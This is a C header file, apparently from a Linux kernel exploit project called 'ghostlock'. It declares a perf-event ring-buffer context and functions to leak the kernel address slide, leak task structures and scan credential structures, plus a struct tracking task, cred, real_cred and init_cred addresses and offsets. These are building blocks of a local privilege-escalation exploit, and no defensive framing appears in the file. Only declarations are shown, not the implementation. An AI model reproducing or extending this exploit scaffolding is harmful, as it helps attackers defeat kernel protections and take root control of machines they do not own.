#ifndef GHOSTLOCK_KPROBE_LEAK_H
#define GHOSTLOCK_KPROBE_LEAK_H

#include "common.h"

struct gl_perf_ctx {
    int perf_fd;
    void *ring;
    size_t ring_len;
    size_t data_off;
    size_t data_size;
    volatile uint64_t *data_head;
    volatile uint64_t *data_tail;
    uint8_t *data_base;

    uint64_t bp_addr;

    int filter_tid;
};

struct gl_offsets;

struct gl_runtime_ids {
    uint64_t task;
    uint64_t cred;
    uint64_t real_cred;
    uint64_t init_cred;
    uint32_t task_off_real_cred;
    uint32_t task_off_cred;
    int valid;
};

int gl_perf_open(struct gl_perf_ctx *ctx, const struct gl_offsets *off,
                    pid_t pid);

int gl_leak_slide(struct gl_perf_ctx *ctx, uint64_t *slide);

int gl_scan_creds(struct gl_perf_ctx *ctx, struct gl_task_pair *pair);

void gl_perf_close(struct gl_perf_ctx *ctx);

int gl_leak_task(struct gl_perf_ctx *ctx, uint64_t slide);

const struct gl_runtime_ids *gl_runtime_ids(void);
void gl_runtime_ids_store(const struct gl_runtime_ids *ids);

#endif
